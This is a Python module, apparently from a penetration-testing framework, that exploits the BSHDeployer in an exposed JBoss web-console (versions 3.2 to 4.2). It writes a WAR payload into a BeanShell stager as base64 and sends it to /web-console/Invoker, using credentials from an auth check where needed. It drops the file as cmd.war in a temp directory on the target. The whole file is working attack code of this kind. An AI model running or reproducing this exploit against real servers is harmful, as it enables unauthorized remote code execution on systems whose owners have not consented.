from src.platform.jboss.authenticate import checkAuth
from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import bsh_deploy
from log import LOG
from base64 import b64encode
from os import system, path
import utility


versions = ["3.2", "4.0", "4.2"]
title = JINTERFACES.WC
def deploy(fingerengine, fingerprint):
    """ This module exploits the BSHDeployer in an exposed JBoss web-console.
    It essentially invokes /web-console/Invoker to download and deploy a BSH,
    which can be used as a stager for our WAR payload.
    """

    war_file = path.abspath(fingerengine.options.deploy)
    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/web-console/Invoker".format(
                  fingerengine.options.ip, fingerprint.port)

    if not rewriteBsh(war_file, fingerengine.options.remote_os):
        utility.Msg("Failed to write WAR to BSH", LOG.ERROR)
        return

    # poll the URL to check for 401
    response = utility.requests_get(url)
    if response.status_code == 401:
        utility.Msg("Host %s:%s requires auth for web-console, checking.." %
                    (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            (usr, pswd) = (cookies[1].username, cookies[1].password)
            response = bsh_deploy(fingerengine.options.remote_os, url,  
                                  fingerprint.version.split('.')[0], 
                                  usr, pswd)
        else:
            utility.Msg("Could not get auth for %s:%s" %
                         (fingerengine.options.ip, fingerprint.port), LOG.ERROR)

    else:
        # run our java lib for the serialized request
        response = bsh_deploy(fingerengine.options.remote_os, url,
                              fingerprint.version.split('.')[0]) 

    # remove the copied bsh
    system("rm ./src/lib/jboss/bsh_deploy/bshdeploy.bsh")

    if response:
        if type(response) is str and response != '':
            utility.Msg(response, LOG.DEBUG)
        elif response.returncode > 0:
            utility.Msg("Failed to deploy to %s:%s" % (fingerengine.options.ip,
                                                   fingerprint.port), 
                                                   LOG.ERROR)
            utility.Msg(response.output, LOG.DEBUG)
            return
    
    utility.Msg("{0} deployed to {1}".format(war_file,
                                                fingerengine.options.ip),
                                                LOG.SUCCESS)


def rewriteBsh(war_file, arch):
    """ Makes a copy of our beanshell script template and replaces
    a handful of placeholder variables, such as WAR data and write path.
    """

    try:
        
        base = "./src/lib/jboss/bsh_deploy"
        b64 = b64encode(open(war_file, "rb").read())
        path = getPath(arch)
       
        with open("{0}/_bshdeploy.bsh".format(base)) as f1:
            with open("{0}/bshdeploy.bsh".format(base), "w") as f2:
                for line in f1:
                    tmp = line

                    # replace our vars
                    if "[[WDATA]]" in line:
                        tmp = tmp.replace("[[WDATA]]", b64)
                    elif "[[ARCH]]" in line:
                        tmp = tmp.replace("[[ARCH]]", path)
                    f2.write(tmp)

        return True
    except Exception, e:
        utility.Msg(e, LOG.ERROR)
    
    return False


def getPath(arch):
    """ Different paths for different architectures
    """

    return "c:/windows/temp/cmd.war" if arch is "windows" else "/tmp/cmd.war"
